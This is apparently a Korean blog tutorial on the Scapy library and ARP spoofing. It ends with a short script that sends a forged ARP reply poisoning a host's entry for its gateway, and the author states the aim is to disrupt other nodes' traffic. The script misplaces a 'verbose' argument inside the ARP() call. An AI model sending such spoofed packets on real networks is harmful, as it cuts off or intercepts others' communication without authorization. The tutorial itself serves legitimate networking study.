# 프롤로그

Scapy 라이브러리를 사용하면 패킷을 간편하게 생성할 수 있습니다. 이를 이용하여 네트워크 자동화나 다양한 네트워크 기술 또는 공격을 실험할 수 있습니다. ARP 패킷을 만들어보는 것으로 Scapy 라이브러리를 활용해보고자 했는데, ARP를 구현하는 것도, ARP Spoofing으로 다른 노드 간 패킷 교환을 중계(MITM; Man In The Middle)하는 것을 구현하는 것도 꽤나 번거로운 일이었습니다. 대신 ARP Spoofing으로 다른 노드의 통신을 방해하는 코드만 간단히 구현할 것입니다.

# Scapy

Scapy는 Python용 네트워크 패킷 제어 라이브러리입니다.

Scapy의 주요 기능은 다음과 같습니다.

- 패킷 생성, 수정, 전송, 수신, 필터링, 분석, 캡처 기능
- 편리한 패킷 생성 및 제어 함수
- 프로토콜 구현 및 디버깅
- 스크립팅 및 자동화
- 네트워크 테스트 및 시뮬레이션

특히, `/` 기호로 매우 편리하게 패킷의 캡슐화를 정의할 수 있습니다.

```python
import scapy.all

scapy.all.IP(dst="192.168.0.10") / scapy.all.TCP(dport=80, sport=10000)
```

# ARP Spoofing

일반적으로 컴퓨터 사용자는 네트워크 상의 노드를 IP 주소로 식별합니다. IP 주소는 Internet Protocol에서 사용하는 주소 체계이며, 이더넷 네트워크에 한정하여 세그먼트 내의 노드를 식별하기 위해 Ethernet Protocol의 주소 또한 필요합니다. ARP(Address Resolution Protocol)이 노드의 IP 주소로 로컬 네트워크 내의 MAC 주소를 식별하는데 사용됩니다.

ARP를 통하여 주소를 식별하는 과정은 크게 아래와 같이 구분하여 설명할 수 있습니다.

1. ARP Request 메시지에 찾고자하는 IP 주소를 포함하여 로컬 네트워크 내에 브로드캐스트함.
2. 로컬 네트워크 내 모든 노드가 ARP Request 메시지를 수신하고, 자신의 IP 주소를 찾는 메시지가 아니라면 무시하고, 맞다면 (3)으로 계속 진행함.
3. ARP Reply 메시지를 생성하여 ARP Request 메시지를 생성한 노드에게 실제 MAC 주소를 전달함.

ARP Reuqest 메시지를 브로드캐스트한 이후 ARP Reply가 적법한지 검증하지 않고 먼저 들어온 ARP Reply를 믿는 특성을 이용하면, 다른 노드 간의 IP 패킷을 가로채서 의도하지 않은 MAC 주소로 보낼 수 있다.

# Scapy로 ARP 패킷 메시지 생성

다음 코드를 실행하면, 192.168.0.10(00:15:5D:00:00:03)에게 192.168.0.1 노드의 MAC 주소가 00:15:5D:00:00:02라는 내용의 ARP Response를 전송합니다.

```python
import scapy.all, scapy.layers.l2

scapy.all.send(
    scapy.layers.l2.ARP(
        op=2,
        pdst="192.168.0.10",
        hwdst="00:15:5d:00:00:03",
        psrc="192.168.0.1",
        hwsrc="00:15:5d:00:00:02",
        verbose=False,
    )
)
```
